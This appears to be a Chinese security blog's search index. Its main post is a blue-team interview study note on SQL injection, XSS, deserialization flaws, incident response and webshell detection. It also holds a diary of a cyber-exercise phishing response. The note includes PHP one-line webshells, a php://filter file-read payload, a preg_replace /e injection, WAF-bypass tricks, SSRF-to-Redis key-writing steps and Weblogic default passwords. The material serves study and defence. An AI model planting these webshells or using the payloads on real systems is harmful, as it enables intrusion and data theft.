[{"content":"宽肩 强化胸部 强化背部 强化臀部 饮食 ","date":"2024-12-29T16:18:41+08:00","image":"https://flowers-boy.github.io/p/%E5%81%A5%E8%BA%AB/%E5%81%A5%E8%BA%AB_hu777416071567483652.png","permalink":"https://flowers-boy.github.io/p/%E5%81%A5%E8%BA%AB/","title":"健身"},{"content":" sql注入分类 **原理：**没有对用户输入项进行验证和处理直接拼接到查询语句中\n查询语句中插⼊恶意SQL代码传递后台sql服务器分析执行\n**从注入参数类型分：**数字型注入、字符型注入\n**从注入效果分：**报错注入、布尔注入、延时注入、联合注入、堆叠注入、宽字节注入\n**从提交方式分：**GET注入、POST注入、HTTP头注入、COOKIE注入\n**报错注入用到的函数：**updatexml、floor、extractvalue，exp\n**布尔盲注用到的函数：**substr，mid，left，right，ascii，ord，char，length\n**时间盲注用到的函数：**sleep\nSQL注入防御\n对关键函数或字符过滤：union select order by information_schema等 下载相关防范注入文件，通过incloude函数包含在网站配置文件里面 pdo预处理，使用预编译语句 添加白名单来规范输入验证方法 对客户端输入进行控制，限制特殊字符和函数的输入 SQL注入绕过waf：\n大小写双写、双写关键字、空格、 使用编码：unioncode编码 十六进制编码 url编码 等价函数：mid，substr（），substring（） \u0026amp;\u0026amp;和||\u0026gt; and 和or =号可以用\u0026lt;\u0026gt;因为如果不大于不小于就是等于 SQL注入写shell条件：\n知道web服务器的绝对路径 数据库具有root权限 secure_file_priv函数 没有特殊的值 PHP关闭魔术引号，php主动转义功能关闭 SQL写入shell的方式：\n通过本地写入into outfile函数\n通过日志写入需要对 general_log 和 general_log_file 变量进行更改\n通过sqlmap \u0026ndash;os-shell命令写入\n二次注入：\n后端代码对用户输入的数据进行了转义，然后在保存到数据库的时候是没有进行转 义，然后再从数据库当中取出数据的时候，没有对数据库中的特殊字符进行转义和验证，就可能 形成闭合，导致注入 防御：使用统一编码格式utf-8对用户输入的内容进行验证过滤 其他常见漏洞 csrf **原理：**跨站点请求伪造。盗用用户身份，以用户的名义发送恶意请求\nssrf **原理：**利用网络请求的服务当跳板攻击内部其他服务\n文件包含 **原理：**攻击者通过操纵应用程序对文件路径的处理，将恶意文件包含到应用程序中执行\n文件上传 **原理：**对上传文件无限制后缀以及类型或者处理缺陷、导致越过本身权限向服务器上马\n绕过方法：\n上传特殊可解析后缀\n上传.htaccess（可帮助修改文件扩展名）\n1 .user.ini文件里的意思是：所有的php文件都自动包含指定的文件 后缀大小写、双后缀名、空格（黑名单）\nMIME、%00截断、0x00截断绕过（白名单）\n1 2 在url中%00表示ascll码的0 ，而ascii码的0，表示字符串结束，所以当url中出现%00时就会认为读取已结束 0x00原理相同 文件头\nxss **原理：**插入恶意脚本、实现对用户浏览器攻击\n**类型：**存储、反射、dom\n**反射和dom区别：**DOM-XSS是javascript处理输出、⽽反射性xss是后台程序处理\nxxe **原理：**解析用户传入的xml\n**作用：**内⽹端⼝扫描、利⽤file协议等读取⽂件、攻击内⽹web应⽤使⽤get(struts2等)\n如何判断文件上传一次攻击 响应包是200,返回的有没有路径,请求包的报文内容有没有上传木马,尝试访问路径,能不能执行命令\n命令执行和代码执行 **命令执行：**Web应用的脚本代码在执行命令的时候过滤不严,从而注入一段攻击者能够控制的代 码,在服务器上以Web服务的后台权限远程执行恶意指令\n**原因：**代码层过滤不严，系统的漏洞造成命令注入,调用的第三方组件存在代码执行漏洞常见执行 函数：exec、shell_exec、system、passthru、popen\n**代码执行：**由于服务器对危险函数过滤不严,导致用户输入的一些字符串可以被转换成代码来执行, 从而造成代码执行\n**原因：**用户能够控制函数输入,存在可执行代码的危险函数，常见执行函数：eval、assert、 preg_replace()\nCSRF 和 XSS 和 XXE 有什么区别 XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。\n修复方式： 对字符实体进行转义\n使用HTTP Only来禁止JavaScript读取Cookie值\n输入时校验\n浏览器与Web应用端采用相同的字符编码\nCSRF是跨站请求伪造攻击，是由于没有在关键操作执行时进行是否由用户自愿发起的确认，模仿合法用户对服务器发起请求 。\n修复方式： 筛选出需要防范CSRF的页面然后嵌入Token\n再次输入密码\n检验Referer\nXXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。\n修复方式： XML解析库在调用时严格禁止对外部实体的解析\nJAVA框架漏洞 shiro是apache的java安全框架，用于执行身份验证、授权、密码和会话管理\n使用shiro易于理解的API（程序接口），可以快速轻松对应用程序进行保护\nShiro550原理导致shiro反序列化的主要原因就是shiro提供的记住密码功能，当用户打开这个功 能时会在请求包中生成一个cookie，cookie的value值是经过序列化-\u0026gt;aes加密-\u0026gt;base64加密后 的字符串，关键在于aes加密的秘钥是默认的，如果没有修改这个秘钥，就会导致反序列化漏洞， 攻击者可以构造恶意代码，将恶意代码序列化-AES加密-base64加密后传入cookie，这样就导致 RCE漏洞。\nShiro 721原理Shrio所使用的cookie里的rememberMe字段采用了AES-128-CBC的加密模式， 这使得该字段可以被padding oracle 攻击利用。攻击者可以使用一个合法有效的rememberMe 的cookie作为前缀来实施POA，然后制造一个特制的rememberMe来执行Java反序列化攻击。\nshrio550和721的区别主要区别 在于Shiro550使用已知默认密码，只要有足够的密码，不需要 Rememberme的Cookie；Shiro721的AES加密的key为系统随机生成，需要利用登录后的 rememberMe去爆破正确的key值。利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，再去构造反序列化攻击。\nfastjson反序列化漏洞原理： fastjson 是一个 有阿里开发的一个开源Java 类库，可以将 Java 对象转换为 JSON 格式(序列化)，当然它也可以将 JSON 字符串转换为 Java 对象（反序列化）\n1、fastjson提供的反序列化功能允许用户传入json格式数据的时候通过@type的value值指定任 意反序列化类名\n2、fastjson的反序列化机制会将反序列的类进行实例化对象，并调用该对象的setter和部分getter方法\n3、恶意用户可以构造payload是目标应用的代码执行流程进入这部分setter和getter方法，如果 这些方法中存在Gadget，就会造成一些安全问题。\n4、官方采取黑名单过滤的方法，对反序列化的类名进行校验，checkAutoType不断被绕过\nlog4j2原理： log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具\nApache Log4j2中存在JNDI注入漏洞，主要原理是利用log4j2的日志输出jndi远程 对象时,调用远程对象没做检查导致，程序将用户输入的数据进行日志记录时即可触发该漏洞并可 在目标服务器上执行任意代码。该漏洞利用过程需要找到一个能触发远程加载并应用配置的输入 点，迫使服务器远程加载和修改配置的前提下使目标系统通过JNDI远程获取数据库源，触发攻击者的恶意代码\nStruts2原理： 将用户要求按照业务逻辑执行并且返回结果\n用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式 %{value}进行解析，然后重新填充到对应的表单数据中。\n例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行\nWeblogic： 漏洞描述：\nWeblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机。T3协议在开放WebLogic控制台端口的应用上默认开启。攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击（开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。）\n远程攻击者可利用该漏洞在未授权的情况下发送攻击数据，通过T3协议（EJB支持远程访问，且支持多种协议。这是Web Container和EJB Container的主要区别）在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过JRMP协议（Java Remote Messaging Protocol：java远程消息交换协议）达到执行任意反序列化payload的目的。\n**T3协议：**用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。\n**RMI：**远程方法调用\n使用协议：JRMP\nT3就是对JRMP的优化。Java RMI 的基础通信协议是 JRMP ，但是也支持开发其他的协议来优 化 RMI 的传输，这里的 Weblogic 的 T3 协议就是其优化版本，相比于JRMP协议多了一些特 性。T3协议传输过程中就是序列化和反序列化方式\n**利用：**将原本存在的序列化内容替换成我们payload的序列化内容，在传输完成后，进行反序列 化达成攻击的目的\nJboss JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免 费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核 心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。\n两种利用方式，第一种是利用未授权访问进入JBoss后台进行文件上传的漏洞；另一种是利用Java 反序列化进行远程代码执行的漏洞\n弱口令漏洞\n1 2 3 4 5 6 7 8 system:password weblogic:weblogic admin:secruity joe:password mary:password system:sercurity wlcsystem: wlcsystem weblogic:Oracle@123 webshell管理工具 菜刀\nbase64加密，php马有eval，(base64_decode ($POST[z0])),\u0026amp;z0=QGluaV9zZXQ\n蚁剑\n以 0x 开头的参数名，@ini_set(\u0026ldquo;display_errors\u0026rdquo;,\u0026ldquo;0\u0026rdquo;)\n冰蝎\n1、大量的 content-type：application，content-type 为 application/octet-stream。\n2、默认内置 16 个 ua，content-length 请求长度payload 都为定长\n3、Accept头有application/xhtml+xmlapplication/xmlapplication/signed-exchange属于弱 特征\n哥斯拉\n1、pass =eval(base64_decode\u0026hellip;，pass=加密数据\n2、user-agent,accept,accept-language 固定\n一共会产生3个 POST 数据包，POST请求报文中参数名都是 pass （即shell的连接密码），参 数值都是加密数据。\nwindows+Linux应急响应流程 检查系统账号安全查看服务器是否有弱口令\n远程管理端口是否对公网开放\n查看服务器是否存在可疑账号、新增账号\n查看服务器是否存在隐藏账号、克隆账号\n检查异常端口、进程\n检查启动项、计划任务、服务\n查看可疑文件和目录\n查看webshell创建的时间\nWindows入侵排查思路 1.检查系统账号安全 2.查看服务器是否有弱口令，远程管理端口(3389)是否对公网开放（使用 netstat -ano 命令、或者问服务器管理员） 3.lusrmgr.msc(本地用户和本地用户组) 快捷命令查 看服务器是否存在可疑账号、新增账号，如有管理员群组的（Administrators）里的新增账户， 如有，请立即禁用或删除掉 4.用 D 盾或者注册表(regedit)中查看服务器是否存在隐藏账号、克隆 账号 5.结合日志，查看管理员登录时间、用户名是否存在异常，使用eventvwr.msc打开“事件查 看器”，导出 Windows 日志–安全，利用 Log Parser 进行分析 6.检查异常端口、进程 netstat - ano检查端口连接情况，是否有远程连接、可疑连接 然后使用 tasklist |findstr PID 进行定位 7. 使用快捷命令 msconfig查看是否存在命名异常的启动项目， 输入regedit注册表中查看开机启动项是否正常，输入gpedit.msc查看本地组策略，使用services.msc检查是否有异常服务 8.检查系统相关信息 systeminfo查看系统版本以及补丁信息 查找可疑目录及文件\nLinux入侵排查思路 bash的账户，正常为/nologin 2.查看本机开启端口服务信息 netstat -anlutp,然后去查看每个开 启服务所产生的日志信息 （var/log目录下）（举例如何查看mysql日志，首先登录mysql，然后 使用 show variables like \u0026lsquo;%general_log%\u0026rsquo; 查看日志是否开启和路径信息） 二、 服务入侵排查 1.使用last命令检查系统登录日志，统计ip登录错误次数和登录情况 2.使用 ls -l 查看 /etc/passwd文件 的修改时间 查看是否有特权用户 查看网站开启的端口ss -anlutp 3.使用ps - elf 看UID为0的进程 查看ssh的公钥是否被修改 4.查看网站根目录（/var/www）下是否存在可疑 文件 5.查看计划任务 /etc/crontab 三、异常启动排查 1.ps -elf 查看进程 2.查看linux 系统服务 /etc/rc.d/init.d 3.查看用户自定义开机启动程序 /etc/rc.d/rc.local\n应急响应流程 1、收集信息：搜集客户信息和中毒信息，备份\n2、判断类型：判断是否是安全事件、是何种安全事件（勒索病毒、挖矿、断网、ddos等）\n3、深入分析：日志分析、进程分析、启动项分析、样本分析\n4、清理处置：杀掉恶意进程、删除恶意文件、打补丁、修复文件\n5、产出报告：整理并输出完整的安全事件报告\nwindows应急 1.查看系统账号安全\n查看服务器是否有弱口令、可疑账号、隐藏账号、克隆账号、远程管理端口是否对公网开放\nwin+r（eventwmr.msc）查看系统日志，查看管理员登录时间、用户名是否存在异常\n2.检查异常端口、进程\nnetstat -ano 检查端口连接情况，是否有远程连接、可疑连接\ntasklist | findstr \u0026ldquo;PID\u0026quot;根据pid定位进程\n使用功能查杀工具\n3.启动项检查、计划任务、服务\n检查服务器是否有异常的启动项，msconfig看一下启动项是否有可以的启动\n检查计划任务，查看计划任务属性，可以发现木马文件的路径\n见擦汗服务自启动，services.msc注意服务状态和启动类型，检查是否有异常服务\n4.检查系统相关信息\n查看系统版本以及补丁信息 systeminfo\n查找可以目录及文件 是否有新建用户目录 分析最近打开分析可疑文件 （%UserProfile%\\Recent）\n5.自动化查杀\n使用360 火绒剑 webshell后门可以使用d盾 河马等\n6.日志分析\n360星图日志分析工具 ELK分析平台\nlinux应急 1、检查用户及密码文件/etc/passwd、/etc/shadow 是否存在多余帐号，主要看一下帐号后面 是否是 nologin,如果没有 nologin 就要注意；\n2、通过 who 命令查看当前登录用户（tty 本地登陆 pts 远程登录）、w 命令查看系统信息，想 知道某一时刻用户的行为、uptime查看登陆多久、多少用户，负载；\n3、修改/etc/profile的文件，在尾部添加相应显示间、日期、ip、命令脚本代码，这样输入 history命令就会详细显示攻击者 ip、时间历史命令等；\n4、用 netstat -antlp|more命令分析可疑端口、IP、PID，查看下 pid 所对应的进程文件路径， 运行ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的pid 号）；\n5、使用ps命令，分析进程 ps aux | grep pid\n6、使用 vi /etc/inittab 查看系统当前运行级别，通过运行级别找到/etc/rc.d/rc[0~6].d对应目录 是否存在可疑文件；\n7、看一下crontab定时任务是否存在可疑启用脚本；\n8、使用chkconfig \u0026ndash;list 查看是否存在可疑服务；\n9、通过grep awk命令分析/var/log/secure安全日志里面是否存在攻击痕迹；\n10、chkrootkit、rkhunter、Clamav 病毒后门查杀工具对 Linux 系统文件查杀；\n11、如果有 Web 站点，可通过 D 盾、河马查杀工具进行查杀或者手工对代码按脚本木马关键 字、关键涵数（evel、system、shell_exec、exec、passthru system、popen）进行查杀 Webshell 后门。\nwindows事件ID 事件ID 说明 4624 登录成功 4625 登录失败 4634 注销成功 4647 用户启动的注销 4672 使用超级用户（如管理员）进行登录 4720 创建用户 sql注入是否误报 如何判断是攻击还是误报\n第一时间去判断内网还是外网，内网大部分都是172 192 10 如果是内网对内网，大概率是真实业务，很少见打到内网，查询字段内容，响应包是否是正常业务，看状态码判断攻击成功\n如果是外网，先去看状态码 如果是200，微步平台看是否是恶意ip 先上报封禁，攻击报文如果是正常业务 那我们对这个业务监控，如果是sql语句攻击，看里面报文的攻击语句，比如常见sleep函数延时注入，extractvalue、updatexml函数 的报错注入，把攻击行为给客服反馈过去\nssrf打redis ssrf扫描内网,端口6379是redis,然后redis未授权漏洞利用\n利用dict协议可以扫描开放的端口，探测指纹信息，可以攻击redis服务 dict://ip:port/info 截获get请求包和post请求包，再构造成符合gopher协议的请求，从而模拟redis通信\n更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）并设置上传公钥的备份文件名字 为authorized_keys,将一开始生成的SSH公钥写入authorized_keys文件中。\nPHP一句话木马 1 2 3 4 5 \u0026lt;?php @eval($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; \u0026lt;?php @eval($_REQUEST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;eval($_GET[\u0026#39;cmd\u0026#39;]);\u0026lt;/script\u0026gt; GIF89a? \u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;eval($_REQUEST[\u0026#39;mima\u0026#39;])\u0026lt;/script\u0026gt; 序列化反序列化及其流量特征 **序列化：**对象转换为字符串\n**反序列化：**字符串转换为对象\n流量特征：\n**shiro反序列化：**查看cookie中rememberme字段，恶意命令要从这里传入。判断是否有漏洞， 查看返回包set cookie：rememberme=deleteme，验证失败返回的标识符。\n**fastjson反序列化：**请求报文中查找json格式的数据，重点看有无rmi或者出网的一些行为\n**st2-045：**请求头中的Content-Type字段\n常见的设备,出现误报怎么办 奇安信天眼,设备类型:全流量,天眼、EDR、全流量告警、态势感知、APT、蜜罐设备,微步tdp,青藤云HIDS,明御安全网关先去查看设备的完整流量日志等信息确认是否为误报，误报那就是规则问题，上报处置，提供规则优化建议\nwireshark指令 http contains \u0026ldquo;关键字\u0026rdquo;\nhttp.response.code == 200\nhttp.request.method == POST\ntcp.prot == 80\nip.addr == \u0026ldquo;10.1.1.1\u0026quot;ip.srcip.dst\n中挖矿病毒怎么解决 首先ps -aux查看进程分析\n然后top 分析算力，挖矿用到的算力比较多，对流量进行过滤，含有矿池服务器的流量就是挖矿病毒\n最后kill进程，rm掉程序\n删不掉这么办\n先下线，然后检查挖矿是否有在内网传播及时下线所有被传播的主机、上机排查攻击痕迹、一般 可以从cpu占用情况，可以进程、开放端口、计划任务、服务项几个方面排查\n将样本上传到在线分析平台，清除挖矿主程序主要就是双向封禁矿池地址、删除计划任务自启 动、删服务，结束恶意进程、删病毒\n**删不掉：**确认一下一下是因为程序在使用，还是权限不够，更具具体情况采取措施 直接降权，降权到没有执行权限\n拿到webshell不出网情况下怎么办 reg上传去正向连接。探测出网协议，如dns，icmp\n怎么排查java内存马 直接利用内存马检测工具去找，github也有很多检测脚本，手工的话可以分析web日志，filter或者listener类型的内存马，会有大量路径相同参数不同的url请求，或者页面不存在但是返回200的请求，分析web.xml文件，内存马的Filter是动态注册的，web.xml是没有配置的，也有可能是中间件漏洞通过代码执行加载内存马，这就可以去排查中间件的错误日志，像哥斯拉和冰蝎的内存马也会有跟webshell相似的特征，分析特殊的classloader加载，攻击者喜欢利用TemplatesImpl和bcel加载内存马，因为内存马是驻留在内存里的，本地无class文件，通过检测Filter对应的ClassLoader目录下是否存在class文件来判断，也可以把内存中所有的Filter的class dump出来，使用工具分析是否存在恶意代码\n蜜罐原理 **创建虚拟环境：**在网络中创建一个看似易受攻击的虚拟环境，该环境模拟真实系统的一部分或全 部功能，包括应用程序、服务和操作系统。\n**引诱攻击者：**通过暴露蜜罐的存在，例如通过公开可访问的IP地址或虚假的网站，吸引攻击者主 动尝试入侵、扫描或攻击蜜罐系统。\n**监测和记录：**一旦攻击者进入蜜罐系统，蜜罐会记录攻击者的行为、攻击技术和使用的工具。 这些信息对于理解攻击者的策略和行为非常有价值。\n**分析和响应：**通过分析记录的数据，研究人员可以识别攻击者的行为模式、漏洞利用方法和漏洞 的目标。\n这些信息可以用于改进真实系统的安全性，及时发现和应对新的威胁。 蜜罐的优势在于能够提供高质量的攻击数据和情报，帮助安全团队更好地了解攻击者的行为模式和目的，加强防御措施并及时应对威胁。\n然而，蜜罐也需要专业人员来设计、部署和管理，以确保其安全性和有效性，并避免对真实系统 造成潜在的风险。\n内存马查杀\u0026amp;原理 java内存马原理\n通过在Java虚拟机（JVM）中运行的恶意代码，实现对被攻击者系统的远程控制。其原理是通过在Java虚拟机中注入特定的Java类、变量或方法等Java对象，然后在Java虚拟机中运行这些代码，实现对受害者机器的远程控制\njava内存马排查\n利用Java Agent技术遍历所有已经加载到内存中的class。 先判断是否是内存马，是则进入内存查杀。\n识别\n1，filter名字很特别\n2，filter优先级是第一位\n3，对比web.xml中没有filter配置\n4，特殊classloader加载\n5，对应的classloader路径下没有class文件\n6，Filter的doFilter方法中 有恶意代码\n清除\n1、清除内存马中的Filter的恶意代码，2、 模拟中间件注销Filter\n常见的危险PHP函数总结 eval() — 把字符串作为PHP代码执行\n语法eval( string $code ) : mixed\n把字符串 code 作为PHP代码执行。\n这个函数一般都是攻击者用的，没什么人会拿这个放到自己的源码里面\nPHP官方也给出了警告\nassert() — 检查一个断言是否为 false （把字符串作为PHP代码执行）\n语法\nPHP 5\nassert( mixed $assertion , string $description = ? ) : bool\nPHP 7\nassert( mixed $assertion , Throwable $exception = ? ) : bool\nassert()会检查指定的 assertion 并在结果为 false 时采取适当的行动（把字符串 $assertion 作为PHP代码执行）\npreg_replace — 执行一个正则表达式的搜索和替换\n语法\npreg_replace( mixed $pattern , mixed $replacement , mixed $subject , int $limit = -1 , int \u0026amp;$count = ? ) : mixed\n搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换。\n/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码\n1 preg_replace(\u0026#34;/test/e\u0026#34;,$_GET[\u0026#34;h\u0026#34;],\u0026#34;jutst test\u0026#34;); 如果我们提交 ?h=phpinfo()，/e就会将h参数当做PHP代码，phpinfo()将会被执行。\n引发命令执行的危险函数 system — 执行外部程序，并且显示输出\n说明\nsystem( string $command , int \u0026amp;$return_var = ? ) : string\n同 C 版本的 system()函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。\n如果 PHP 运行在服务器模块中， system()函数还会尝试在每行输出完毕之后， 自动刷新 web服务器的输出缓存。\n如果要获取一个命令未经任何处理的 原始输出，请使用 passthru()函数。\n举个例子\n1 \u0026lt;?php system(\u0026#34;whoami\u0026#34;);?\u0026gt; exec — 执行一个外部程序\nexec()执行 command 参数所指定的命令\n举个例子\n1 \u0026lt;?php echo exec(\u0026#34;whoami\u0026#34;);?\u0026gt; shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字 符串的方式返回。\n1 \u0026lt;?php echo shell_exec(\u0026#34;whoami\u0026#34;);?\u0026gt; passthru — 执行外部程序并且显示原始输出\n1 \u0026lt;?php passthru(\u0026#34;whoami\u0026#34;);?\u0026gt; 引发文件包含的危险函数 主要作用为包含并运行指定文件。\ninclude()：代码执行到此函数时才将文件包含进来，发⽣错误时只警告并继续执行 include_once()：功能和前者一样，区别在于调用同一文件时，程序只调用一次 require()：立即调用此函数包含文件，发⽣错误时，会输出错误信息 并⽴即终⽌程序 require_once()：功能和前者一样，区别在于调用同一文件时，程序只调用一次 include $file;\n在变量 $file 可控的情况下，我们就可以包含任意文件，从而达到 getshell 的目的。\n另外，在不同的配置环境下，可以包含不同的文件。\n因此又分为远程文件包含和本地文件包含。\n包含函数也能够读取任意文件内容，这就需要用到【支持的协议和封装协议】和【过滤器】。\n例如，利用php流filter读取任意文件\ninclude($_GET[\u0026lsquo;file\u0026rsquo;]);\n?file=php://filter/convert.base64-encode/resource=index.php\n解释：?file=php:// 协议 / 过滤器 / 文件\n引发文件操作的危险函数 copy\nfile_get_contents()\nhighlight_file()\nfopen()\nread file()\nfread()\nfgetss()\nfgets()\nparse_ini_file()\nshow_source()\nfile()\n任意文件读取、写入、删除往往是上面几个函数受到了控制（当然还有其他的函数）。 不同的函数在不同的场景有不同的作用和不同的利用手法。\n读取：可以读取配置等文件，拿到key\n写入：可以写入shell代码相关的内容\n删除：可以删除.lock文件而可以重新安装覆盖\n更多思路请自行挖掘测试！！\n引发信息泄露的危险函数 phpinfo — 输出关于 PHP 配置的信息\ngetenv — 获取一个环境变量的值\nget_current_user — 获取当前 PHP 脚本所有者名称\ngetlastmod — 获取页面最后修改的时间\nini_get — 获取一个配置选项的值\nglob — 寻找与模式匹配的文件路径\n引发XEE的危险函数 __construct()\naddAttribute()\naddChild()\nasXML()\nattributes()\nchildren()\ngetDocNamespaces()\ngetName()\ngetNamespaces()\nregisterXPathNamespace()\nsimplexml_import_dom()\nsimplexml_load_file()\nsimplexml_load_string()\nxpath()\n引发反序列化的危险函数 序列化函数：serialize()\n反序列化函数：unserialize()\n魔术函数：\n__construc()\n__destruct()\n__call()\n__callStatic()\n__get()\n__set()\n__isset()\n__unset()\n__sleep()\n__wakeup()\n__toString()\n__invoke()\n__set_state()\n__clone()\n__debuginfo()\nJava危险函数 Java命令执行的函数 Runtime类\nRuntime类是私有的， 类的对象无法通过这种方式注册： Runtime r = new Runtime() ;\n只能通过静态方法（getRuntime）获取： Runtime r = Runtime.getRuntime()；\nProcessBuilder类\n这种复现本质意义不大，重点是记一下敏感函数，\nrce2Servlet.java\nProcessImpl类ProcessImpl类通常是为ProcessBuilder.start()创建新进 程服务的，不能直接去调用。\n看到ProcessImpl类构造器私有，所以不能直接对其进行实例化，为了演示可以用反射进行调 用。\n在获取到一个静态方法后，必须用setAccessible修改它的作用域，否则不能调用。\n如何快速判定xss类型 存储型xss：\n发送⼀次带XSS代码的请求，以后这个⻚⾯的返回包⾥都会有XSS代码\n反射型xss：\n发送⼀次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码\ndom型xss：\n发送⼀次带XSS代码的请求，在返回包⾥压根⼉就找不到XSS代码的影⼦\ncsrf、ssrf和重放攻击有什么区别 CSRF是跨站请求伪造攻击，由客户端发起\nSSRF是服务器端请求伪造，由服务器发起\n重放攻击是将截获的数据包进⾏重放，达到身份认证等⽬的\n常见对应端口及服务 设备 安全设备 奇安信天眼 设备类型:全流量 大致使用方法 天眼首页截图:\n左边监测控制台,打开,有告警信息:\n分析时觉得IP有问题可以在攻击IP中搜索\n打开告警列表(奇安信网神?):\n点击详情,显示如下内容:\n微步tdp/tip TDP的 主页面:\n主要点击外部攻击的外部攻击项\n告警主机项，上面可以查询IP：\n内网渗透分析,被攻陷后可以看网络拓扑:\n优势项：自动识别一些恶意IP，即答：tdp威胁情报发现有利于溯源分析\n青藤云HIDS 设备类型:全流量 大致使用方法 主页面，主机资产，安全台账功能，将可疑IP放到里面点击主机详情，看是不是内部IP：\n点击入侵事件,查看告警,点击告警的漏洞名称,可以跳到类似于天眼的详情信息页面\n可以查日志，筛选IP/域名/进程进行查询\n优势项:可以直接发现暴力破解,不需要人工添加规则\n明御安全网关 总结优势 HIDS：对全网信息捕捉\n微步:\n攻击发现，会显示攻击者画像 方便溯源分析 威胁情报发现，发现恶意IP 亚信：ei拦截的恶意文件会自动在an中运行检测生成报告\nddei邮件网关，过滤垃圾邮件，对恶意文件隔离 ddan沙箱（=微步云沙箱）：检测恶意文件，分析恶意样本，收集攻击信息，生成行为报告\n","date":"2024-12-20T16:59:37+08:00","image":"https://flowers-boy.github.io/p/%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/%E9%9D%A2%E8%AF%95_hu17243166191729511498.jpeg","permalink":"https://flowers-boy.github.io/p/%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/","title":"蓝队面试"},{"content":" 7.19到达北京 初次到达北京，一堆事情等着处理，公司录入人脸，找租房，临时放置行李\n拖着行李箱在北京街头游荡，找了家KFC临时休息会，害怕别人给我赶出来特意点了份套餐，现在想想当时也是爱面子，你不买东西人家也不会赶你走\n没找到小超市，在附近问了一家家商铺，说把行李箱临时放一会，一直拒绝，刚开始问的时候还扭扭捏捏，后面越问越不慌张，毕竟也理解，都是打工人店里客流量也大，不想因为小钱担责任，后面遇到一位善良的药店姐姐，将手机号留在那就匆匆去公司录人脸\n到公司被保安卡了，质问我长期还是临时访问，当时给我搞蒙圈了，客户也没给我报备姓名，最后项目经理来接我上去才通过。由于客户还没来得及给我报备，办了个临时的，人脸还需要明天再来一趟，到了刚好熟悉下工作流程\n第二天继续去公司录入人脸培训，北京地铁与郑州地铁区别就是换乘，北京地铁换乘举例将近600多米，有点离谱了，第一次从住宿的地方计算了下将近一小时十分钟，因为住宿的地方在五环外面了，所以通勤时间比较久，熟悉工作内容，写word，整理excel，结束一天的工作\n总结就是：万事开头难\n8.02 在北京生活，消费高，吃饭也贵，干什么都贵，没钱啊，我就天天看哪个外卖最便宜，就是为了省点，这个省下的钱还是花到我身上了，当时给我气的，又没吃好又得了病难受的，去诊所人生地不熟，被宰了75，吃完药还是鼻塞，又在美团买了50的药，来来回回将近也花了150，自那日以后就该吃吃该喝喝了\n最后啊，知道了现场甲方有食堂，也不用吃那些明知道是预制饭还得买的外卖了，平常不忙的话也可以去甲方食堂去吃，很健康\n甲方也开始买零食了\n暂时先到这吧\n8.19 终于熬过一个月了，还好有甲方零食安慰，再坚持一月\n8.30 突然通知要结束了，回光返照一样，这边预约的景点逛完手机就来消息项目要结束了 一个人在外面，踩了很多雷，都是历练了\n总结 HVV突发钓鱼事件 27日下午收到电话，财务处收到“税务抽查通知”的可以邮件，经过排查相关人员点击附件图片，未访问图片内木马程序链接，调取网络日志与终端日志，确认其中一人尝试访问木马下载链接，但由于其及时关机，攻击人员服务器为自建阿里云服务器，网络较慢未完成下载运行过程，暂未发现攻击成功迹象\n开展排查时间对已接受邮件进行断网，防止重启自动联网\n使用安恒设备进行查看分析时间段内异常内向外流量，对设备导出被钓鱼邮件时间段内及终端的原始日志，分析外连IP\n同时发现安恒监控设备时间与网络时间相差，使用NTA平台重启设备更新时间\n目前分析gif文件应该没问题，gif里面那个链接，点击以后会下载一个9m多的压缩包，里面是一个23m左右的exe文件\n35lduXzQ.rar解压后释放35lduXzQ.exe，35lduXzQ.exe主程序释放了一个 t0mcat.exe ，这个程序执行又释放了几个dll，然后回连137.59.16.4。\n同时对回连木马地址进行封禁\n","date":"2024-12-20T16:47:53+08:00","image":"https://flowers-boy.github.io/p/%E5%9B%BD%E6%8A%A4/HVV_hu8781004581799148324.png","permalink":"https://flowers-boy.github.io/p/%E5%9B%BD%E6%8A%A4/","title":"国护"},{"content":" 在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 